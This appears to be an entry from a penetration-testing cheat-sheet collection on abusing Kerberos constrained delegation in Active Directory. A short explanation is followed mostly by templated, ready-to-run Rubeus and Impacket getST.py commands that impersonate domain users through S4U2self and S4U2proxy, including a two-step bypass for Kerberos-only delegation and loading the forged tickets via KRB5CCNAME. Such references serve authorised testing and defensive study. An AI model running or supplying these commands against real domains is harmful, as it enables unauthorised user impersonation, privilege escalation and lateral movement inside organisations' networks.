---
technique: ConstrainedDelegation
category: kerberos-delegation
targets: Domain User, Domain Computer, Service Account
protocols: Kerberos
remote_capable: true
tags: kerberos delegation constrained s4u2self s4u2proxy ad impersonation
---

# Constrained Delegation

When a service account is configured with constrained delegation, it can request service tickets on behalf of other users to a specific set of target SPNs. Compromising that account lets an attacker impersonate any user (except those marked sensitive or in Protected Users) against the allowed target services. Constrained delegation comes in two flavors: with protocol transition (uses S4U2self to obtain a forwardable ticket) and without (Kerberos-only, requires an extra RBCD step to produce a forwardable ticket). Once a service ticket is obtained it is used with pass-the-ticket.

## Windows

Rubeus handles both protocol-transition and the two-step without-transition flows from a Windows machine.

### Rubeus s4u (with protocol transition)

#powershell #rubeus #s4u

Perform a full S4U2self + S4U2proxy attack when the service is configured with protocol transition.

```powershell title:"KCD with protocol transition via Rubeus s4u"
.\Rubeus.exe s4u /nowrap /msdsspn:"$target_spn" /impersonateuser:"$impersonate_user" /domain:"$domain" /user:"$kcd_account" /password:"$pass"
```
<!-- cheat
import users
import passwords
var target_spn
var impersonate_user
var domain
var kcd_account
-->

### Rubeus s4u (without protocol transition, RBCD step 1)

#powershell #rubeus #rbcd

Perform a full S4U attack via serviceB credentials to obtain a forwardable ST to serviceA (RBCD sub-step for Kerberos-only KCD).

```powershell title:"Obtain forwardable ST to serviceA via RBCD sub-step"
.\Rubeus.exe s4u /nowrap /msdsspn:"cifs/$service_a_host" /impersonateuser:"$impersonate_user" /domain:"$domain" /user:"$service_b_account" /password:"$service_b_pass"
```
<!-- cheat
import users
import passwords
var service_a_host
var impersonate_user
var domain
var service_b_account
var service_b_pass
-->

### Rubeus s4u (without protocol transition, S4U2proxy step 2)

#powershell #rubeus #s4uproxy

Supply the previously obtained forwardable ST as additional evidence to complete S4U2proxy and reach the final target service.

```powershell title:"S4U2proxy via serviceA credentials with additional ticket"
.\Rubeus.exe s4u /nowrap /msdsspn:"$final_spn" /impersonateuser:"$impersonate_user" /tgs:"$base64_st" /domain:"$domain" /user:"$kcd_account" /password:"$pass"
```
<!-- cheat
import users
import passwords
var final_spn
var impersonate_user
var base64_st
var domain
var kcd_account
-->

## Linux

Impacket's getST handles all constrained delegation flows from Linux, including the two-step approach for Kerberos-only mode.

### getST (with protocol transition)

#python #impacket #s4u

Obtain a service ticket impersonating a target user via S4U2self + S4U2proxy when protocol transition is enabled.

```sh title:"KCD with protocol transition via getST"
getST.py -spn "$target_spn" -impersonate "$impersonate_user" -dc-ip "$rhost_ip" "$domain"/"$kcd_account":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var target_spn
var impersonate_user
var domain
var kcd_account
-->

### export KRB5CCNAME (with protocol transition)

#shell #env

Set KRB5CCNAME to the ccache written by getST.py so subsequent tools use the impersonated ticket.

```sh title:"Load getST.py ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->

### getST (without protocol transition, RBCD step 1)

#python #impacket #rbcd

Obtain a forwardable ST from serviceB to serviceA as part of the RBCD bypass for Kerberos-only KCD.

```sh title:"Obtain forwardable ST to serviceA (RBCD sub-step)"
getST.py -spn "cifs/$service_a_host" -impersonate "$impersonate_user" -dc-ip "$rhost_ip" "$domain"/"$service_b_account":"$service_b_pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var service_a_host
var impersonate_user
var domain
var service_b_account
var service_b_pass
-->

### getST (without protocol transition, S4U2proxy step 2)

#python #impacket #s4uproxy

Use the forwardable ST from step 1 as additional evidence to complete S4U2proxy toward the final target via serviceA's credentials.

```sh title:"S4U2proxy via serviceA credentials with additional ticket"
getST.py -spn "$final_spn" -impersonate "$impersonate_user" -additional-ticket "$impersonate_user.ccache" -dc-ip "$rhost_ip" "$domain"/"$kcd_account":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var final_spn
var impersonate_user
var domain
var kcd_account
-->

### export KRB5CCNAME (S4U2proxy step 2)

#shell #env

Set KRB5CCNAME to the ccache written by the final getST.py call so subsequent tools use the impersonated ticket.

```sh title:"Load S4U2proxy ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->
